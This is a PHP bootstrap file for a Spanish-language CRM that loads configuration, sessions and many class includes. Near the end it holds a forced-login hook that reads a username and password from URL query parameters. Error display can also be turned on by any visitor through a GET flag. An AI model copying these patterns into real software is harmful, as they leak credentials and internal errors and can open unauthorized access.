<?php

	define('TIME_START', microtime(true));

//------------------ Show Info AWS ------------------//

	error_reporting(0);

//------------------ Set Errors Off At Start ------------------//

	@ini_set('display_errors', false);
	error_reporting(0);

//------------------ Show Errors With Var Instrunsctions ------------------//


	if(	(isset($_GET) && isset($_GET['SvAll']) && ($_GET['SvAll']=='ok')) ||
		$_GET['SvAll']=='ok' || (isset($___bug) && $___bug == 'ok') ||
		(isset($argv) && isset($argv['SvAll']) && $argv['SvAll'] == 'ok') ||
		(isset($_SERVER) && isset($_SERVER['SvAll']) && $_SERVER['SvAll'] == 'ok')){

			@ini_set('display_errors', true);
			error_reporting(E_ALL);
			define('DSERR','on');

	}elseif((isset($_GET) && isset($_GET['Sv']) && ($_GET['Sv']=='ok')) ||
		(isset($___bug) && $___bug == 'ok') ||
		(isset($argv) && isset($argv['Sv']) && $argv['Sv'] == 'ok') ||
		(isset($_SERVER) && isset($_SERVER['Sv']) && $_SERVER['Sv'] == 'ok')){

			@ini_set('display_errors', true);
			error_reporting(E_ALL & ~E_NOTICE /*&& ~E_WARNING*/);
			define('DSERR','on');

	}else{

		@ini_set('display_errors', false);
		error_reporting(0);
		define('DSERR','off');

	}

//------------------ Check Extensions ------------------//

	if(!extension_loaded('mysqli')){ echo 'mysqli not installed'; exit(); }
	if(!extension_loaded('imagick')){ echo 'imagick not installed'; exit(); }
	if(!extension_loaded('mbstring')){ echo 'mbstring not installed'; exit(); }

//------------------ Start Including Base Files ------------------//


	if(file_exists(dirname(__FILE__,2).'/.vendor/autoload.php')){

		require dirname(__FILE__,2).'/.vendor/autoload.php';

		if(file_exists(dirname(__FILE__,2).'/.env')){
			$dotenv = Dotenv\Dotenv::createImmutable( dirname(__FILE__,2) );
			$dotenv->load();
		}

	}

	if( !require_once(dirname(__FILE__).'/common.php') ){ echo 'common.php not included'; exit(); }
	if( !require_once(dirname(__FILE__).'/directories.php') ){ echo 'directories.php not included'; exit(); }

//------------------ NOMBRES DE VARIABLES DE SESION - START ------------------//

	mb_internal_encoding('UTF-8');

	define('MM_ADM', 'MM_UsernameAdm');
	define('MM_ACNT', 'MM_ClientAdm');
	define('MM_ADM_GRP', 'MM_UsernameAdmGroup');
	define('MM_ADM_TST', 'MM_SuperAdmTst');
	define('MM_ADM_SES_ID', 'MM_SesSumr');
	define('MM_CNT', 'MM_UsernameCnt');

	define('MM_ADM_SES_CTRY', MM_ADM_SES_ID.'_Ctry');
	define('MM_ADM_SES_LNG', MM_ADM_SES_ID.'_Lng');

	define('CK_SES', '____SUMR');
	define('CK_SES_C', '____SUMR_c_');
	define('CK_SES_L', '____SUMR_l');
	define('CK_SES_U', '____SUMR_u'); //
	define('CK_SES_R', '____SUMR_r'); // Cookie Redireccion
	define('CK_SES_D', '____SUMR_d'); // Id Device

	define('CKTRCK_SES', '____SUMR_Ck');
	define('CKTRCK_FM', '____SUMR_Fm');
	define('CKTRCK_OAUTH', '____SUMR_Oauth');

	define('LCLS_L', 'SMR_Lng'); // Local Storage - Language


//------------------ NOMBRES DE VARIABLES DE SESION - END ------------------//


define('DIR_CLS_CRM', dirname(__FILE__).'/classes/custom/');
define('DIR_CLS_CRM_EML', DIR_CLS_CRM.'mailing/');
define('DIR_CLS_CRM_LS', DIR_CLS_CRM.'list/');
define('DIR_CLS_CRM_DT', DIR_CLS_CRM.'detail/');
define('DIR_CLS_CRM_FM', DIR_CLS_CRM.'form/');
define('DIR_CLS_CRM_UP', DIR_CLS_CRM.'upload/');
define('DIR_CLS_CRM_EC', DIR_CLS_CRM.'pushmail/');

setlocale(LC_ALL, 'es_ES');
date_default_timezone_set("America/Bogota");

if(file_exists( dirname(__FILE__).'/system/_sis.php' )){
	$__sis_sis = dirname(__FILE__).'/system/_sis.php';
}else{
	$__sis_sis = dirname(__FILE__).'/system/_sis_tmp.php';
}

$__sis_slc = dirname(__FILE__).'/system/_sis_slc.php';
$__sis_ec = dirname(__FILE__).'/system/_sis_ec.php';
$__sis_sms = dirname(__FILE__).'/system/_sis_sms.php';
$__sis_md = dirname(__FILE__).'/system/_sis_md.php';
$__sis_mdlstp = dirname(__FILE__).'/system/_sis_mdlstp.php';

if(file_exists(DIR_CLS_CRM.'aws.php')){ require_once DIR_CLS_CRM.'aws.php'; }
if(file_exists($__sis_sis)){ include_once($__sis_sis); }
if(file_exists($__sis_slc)){ include_once($__sis_slc); }
if(file_exists($__sis_ec)){ include_once($__sis_ec); }
if(file_exists($__sis_sms)){ include_once($__sis_sms); }
if(file_exists($__sis_md)){ include_once($__sis_md); }
if(file_exists($__sis_mdlstp)){ include_once($__sis_mdlstp); }

function mBln($v){ if($v == 1){$r='ok';}else{$r='no';} return $r; }
function Blnm($v){ if($v == 'ok'){$r=1;}else{$r=2;} return $r; }

require_once DIR_CLS_CRM.'connection.php';
require_once DIR_CLS_CRM.'main.php';
require_once DIR_CLS_CRM.'_out.php';

require_once dirname(__FILE__).'/classes/browser.php';
require_once dirname(__FILE__).'/classes/custom/session.php';
require_once dirname(__FILE__).'/customer.php';

setlocale(LC_ALL, 'es_ES');
date_default_timezone_set("America/Bogota");

ini_set('max_execution_time', 30);
ini_set('max_input_time', 9999);
ini_set('memory_limit', '-1');
ini_set("log_errors" , "off");


if(isWrkr()){
	define('USLEP_TME', 500000);
}else{
	define('USLEP_TME', 20000);
}

define('SLEP_TME_AUTO', 1);

if ((!session_id() || !isN(session_id()) ) && $__tp != 'js' && $__https_off != 'off') {

	$_sestime = 60*60*4;

	if(defined('CK_SES')){

		session_name(CK_SES);
		session_cache_limiter('private_no_expire');

		ini_set("allow_url_fopen", 1);

		ini_set('session.cookie_domain', Gt_DMN([ 'sbd'=>$__sess_sbd ]) );
	  	ini_set('session.gc_probability',true);
	  	ini_set('session.gc_divisor',true);
		ini_set('session.use_cookies',true);
		ini_set('session.cookie_httponly',true);
		ini_set("session.cookie_lifetime","31536000");
		ini_set("session.gc_maxlifetime", "31536000");

		if($__bdapi == 'ok' || isWrkr()){
	  		ini_set('session.gc_probability', 1);
	  		ini_set('session.gc_divisor', 100);
	  	}

		if(	Gt_DMN() == 'sumr.co' ||
			Gt_DMN() == 'sumr.cloud' ||
			Gt_DMN() == 'sumr.nz' ||
			Gt_DMN() == 'massivespace.rocks' ||
			!isN($__sess_sbd)
		){
			ini_set('session.hash_function', true);
			ini_set('session.cookie_secure', true);
		}else{
			ini_set('session.hash_function', false);
			ini_set('session.cookie_secure', false);
		}

	}

	if($_GET['Test']=='ok'){ $start = microtime(true); }

	$__aws = new API_CRM_Aws();
	$__aws->_dynamo->registerSessionHandler([ 'table_name'=>Dvlpr()?'dev-session':'prd-session', 'session_lifetime'=>'31536000', 'session_locking'=>false ]);
	session_start();

	if(
		defined('DB_CL_ENC_SES') && !isset($_SESSION[CK_SES]) &&
		empty($_SESSION[DB_CL_ENC_SES.MM_ADM])
		&& $__tp != 'js'
		&& $__https_off != 'off'
	){

		$___ses->__chk();
	}

	if( defined('DB_CL_ENC_SES') && !isset( $_SESSION[DB_CL_ENC_SES.MM_ADM_SES_CTRY] ) ||
		( defined('DB_CL_ENC_SES') && !isset( $_SESSION[DB_CL_ENC_SES.MM_ADM_SES_LNG] ))){
		$___ses->__lng();
	}

}

function _Cl_Lb($p=NULL){

	if($p['sb'] != NULL){

		if($p['sb'] != NULL){ $__sb = $p['sb']; }else{ $__sb = DMN_SB; }

		$__f_inc = dirname( dirname(__FILE__) ).'/__ac/'.$__sb.'/includes/';
		$__f_cls = dirname( dirname(__FILE__) ).'/__ac/'.$__sb.'/includes/classes/';
		$__f_fnc = dirname( dirname(__FILE__) ).'/__ac/'.$__sb.'/includes/functions/';

		$__inc = ['_fnc.php', 'files.php'];
		$__cls = ['_crm.php', '_crm_up.php'];
		$__fnc = ['_dt.php', '_slc.php'];

		foreach($__inc as $_fi){ if(file_exists($__f_inc.$_fi)){ require($__f_inc.$_fi); } }
		foreach($__cls as $_fc){ if(file_exists($__f_cls.$_fc)){ require($__f_cls.$_fc); } }
		foreach($__fnc as $_ff){ if(file_exists($__f_fnc.$_ff)){ require($__f_fnc.$_ff); } }

	}
}

if($_cls_xls == 'ok'){
	require dirname(__FILE__).'/classes/phpexcel.php'; //Has to migrate to phpoffice/phpspreadsheet
	require dirname(__FILE__).'/classes/phpexcel/IOFactory.php';
}

if(!defined('IBS') || (defined('IBS') && IBS != 'ok')){


	//require dirname(__FILE__).'/classes/json.php';
	require dirname(__FILE__).'/classes/fullcontact.php';
	//require dirname(__FILE__).'/classes/Imap/__autoload.php';

	//-------------- CLASES IHERENTES CRM --------------//

		if(file_exists(DIR_CLS_CRM.'audit.php')){ require_once DIR_CLS_CRM.'audit.php'; }
		if(file_exists(DIR_CLS_CRM.'customer.php')){ require_once DIR_CLS_CRM.'customer.php'; }
		if(file_exists(DIR_CLS_CRM.'system.php')){ require_once DIR_CLS_CRM.'system.php'; }
		if(file_exists(DIR_CLS_CRM.'modules.php')){ require_once DIR_CLS_CRM.'modules.php'; }
		if(file_exists(DIR_CLS_CRM.'user.php')){ require_once DIR_CLS_CRM.'user.php'; }
		if(file_exists(DIR_CLS_CRM.'activities.php')){ require_once DIR_CLS_CRM.'activities.php'; }
		if(file_exists(DIR_CLS_CRM.'organization.php')){ require_once DIR_CLS_CRM.'organization.php'; }
		if(file_exists(DIR_CLS_CRM.'_cmp.php')){ require_once DIR_CLS_CRM.'_cmp.php'; }
		if(file_exists(DIR_CLS_CRM.'automation.php')){ require_once DIR_CLS_CRM.'automation.php'; }
		if(file_exists(DIR_CLS_CRM.'mailchimp.php')){ require_once DIR_CLS_CRM.'mailchimp.php'; }
		if(file_exists(DIR_CLS_CRM.'icommkt.php')){ require_once DIR_CLS_CRM.'icommkt.php'; }
		if(file_exists(DIR_CLS_CRM.'download.php')){ require_once DIR_CLS_CRM.'download.php'; }
		if(file_exists(DIR_CLS_CRM.'widget.php')){ require_once DIR_CLS_CRM.'widget.php'; }
		if(file_exists(DIR_CLS_CRM.'api.php')){ require_once DIR_CLS_CRM.'api.php'; }
		if(file_exists(DIR_CLS_CRM.'third.php')){ require_once DIR_CLS_CRM.'third.php'; }
		if(file_exists(DIR_CLS_CRM.'whatsapp.php')){ require_once DIR_CLS_CRM.'whatsapp.php'; }
		if(file_exists(DIR_CLS_CRM.'gateway.php')){ require_once DIR_CLS_CRM.'gateway.php'; }
		if(file_exists(DIR_CLS_CRM.'vtex.php')){ require_once DIR_CLS_CRM.'vtex.php'; }
		if(file_exists(DIR_CLS_CRM.'store.php')){ require_once DIR_CLS_CRM.'store.php'; }
		if(file_exists(DIR_CLS_CRM.'jwt.php')){ require_once DIR_CLS_CRM.'jwt.php'; }
		if(file_exists(DIR_CLS_CRM.'magazine.php')){ require_once DIR_CLS_CRM.'magazine.php'; }


	//------------------ BUILDER ------------------//

		require_once DIR_CLS_CRM.'selector.php';
		require_once DIR_CLS_CRM.'_bld.php';

	//------------------ BUILDER ------------------//

		if(file_exists(DIR_CLS_CRM.'lead.php')){ require_once DIR_CLS_CRM.'lead.php'; }

		require_once DIR_CLS_CRM.'_emp.php';
		require_once DIR_CLS_CRM.'file.php';
		require_once DIR_CLS_CRM_UP.'_up.php';
		require_once DIR_CLS_CRM_UP.'_up_cnt.php';
		require_once DIR_CLS_CRM.'call.php';
		require_once DIR_CLS_CRM.'fullcontact.php';
		require_once DIR_CLS_CRM.'itstatus.php';
		require_once DIR_CLS_CRM.'cdn.php';
		require_once DIR_CLS_CRM.'shorter.php';
		require_once DIR_CLS_CRM_EC.'pushmail.php';
		require_once DIR_CLS_CRM_EC.'custom.php';
		require_once DIR_CLS_CRM.'mailing.php';
		require_once DIR_CLS_CRM.'currency.php';
		require_once DIR_CLS_CRM.'_dsh.php';
		require_once DIR_CLS_CRM.'sms.php';
		require_once DIR_CLS_CRM.'cron.php';
		require_once DIR_CLS_CRM.'_cns.php';
		require_once DIR_CLS_CRM.'websocket.php';
		require_once DIR_CLS_CRM.'google.php';
		require_once DIR_CLS_CRM.'process.php';
		require_once DIR_CLS_CRM.'oauth.php';
		require_once DIR_CLS_CRM.'application.php';
		require_once DIR_CLS_CRM.'doubleverification.php';
		require_once DIR_CLS_CRM.'_bco.php';
		require_once DIR_CLS_CRM_EML.'mailing.php';
		require_once DIR_CLS_CRM_EML.'imap.php';
		require_once DIR_CLS_CRM_LS.'list.php';
		require_once DIR_CLS_CRM_DT.'detail.php';
		require_once DIR_CLS_CRM_FM.'form.php';
		require_once DIR_CLS_CRM.'task.php';
		require_once DIR_CLS_CRM.'notification.php';
		require_once DIR_CLS_CRM.'landing.php';
		require_once DIR_CLS_CRM.'signature.php';
		require_once DIR_CLS_CRM.'_sgn_cod.php';
		require_once DIR_CLS_CRM.'webhook.php';
		require_once DIR_CLS_CRM.'massive.php';
		if(file_exists(DIR_CLS_CRM.'chat.php')){ require_once DIR_CLS_CRM.'chat.php'; }


	//-------------- CLASES IHERENTES CRM --------------//


}

if($__dt_cl->sbd != NULL){ _Cl_Lb([ 'sb'=>DMN_SB ]); }

//if($_cls_gapi == 'ok'){
	//require dirname(__FILE__).'/classes/Google/autoload.php';
//}

require dirname(__FILE__).'/files.php';
require dirname(__FILE__).'/general.php';

if($__nott != 'ok'){ require dirname(__FILE__).'/i18n.php'; }

require dirname(__FILE__).'/functions/main.php';

if($__fbsrc == 'ok'){
	include(dirname(__FILE__).'/'.DIR_INC_FNC_SCL.'_fb.php');
}
if($__twsrc == 'ok'){
	require( dirname(__FILE__).'/classes/twitter/twitter.php' );
}

if($__inssrc == 'ok'){
	//require_once( dirname(__FILE__).'/classes/Instagram/Instagram.php' );
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_SCL.'_ins.php');
}

if($__insslnkd == 'ok'){
	//require_once( dirname(__FILE__).'/classes/LinkedIn/LinkedIn.php' ); // Has to search composer repository
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_SCL.'_lnkin.php');
}

if($__emblue == 'ok'){
	require_once(dirname(__FILE__).'/classes/emblue/emblue.php');
}


//if($__twiliosrc == 'ok'){
	//require_once(dirname(__FILE__).'/classes/Twilio/autoload.php');
	require_once(dirname(__FILE__).'/'.DIR_INC_FNC.'_twilio.php');
//}


//if($__instmedctr == 'ok'){
	require_once( dirname(__FILE__).'/classes/timedoctor/timedoctor.php' );
	require_once( dirname(__FILE__).'/classes/microsoft/microsoft.php' );
//}
	//require_once( dirname(__FILE__).'/classes/SQL_Beautifier/SQL_Beautifier.php' );


//------------------ FUNCIONES SEGMENTADAS ------------------//

	include_once(dirname(__FILE__).'/'.DIR_INC_FNC.'_mnu.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC.'_ls.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC.'_slc.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC.'_dt.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC.'_aud.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC.'_snd.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC.'_ml.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC.'_dsh.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC.'_ec.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC.'_dwn.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC.'_aws.php');


	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_DT.'cl.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_DT.'scl.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_DT.'lnd.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_DT.'sgn.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_DT.'tml.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_DT.'cnt.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_DT.'ec.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_DT.'sms.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_DT.'atmt.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_DT.'chat.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_DT.'act.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_DT.'wdgt.php');
	include_once(dirname(__FILE__).'/'.DIR_INC_FNC_DT.'us.php');


//------------------ FINALIZA FUNCIONES ------------------//

include(dirname(__FILE__).'/estructure.php');

//------------------ Verifico Restricciones ------------------//

if($Rstr == 'adm'){
	include(dirname(__FILE__).'/guard.php');
}

if(isset($_GET['SVUSER_23'])){
	$__dt_lgfrc = Frc_LgIn(Php_Ls_Cln($_GET['SVUSER_23']), Php_Ls_Cln($_GET['___PsAdm']) );
	if($__dt_lgfrc->e == 'ok'){ header('Location: /');
		//echo 'Prueba de forzar login';
	}
}

?>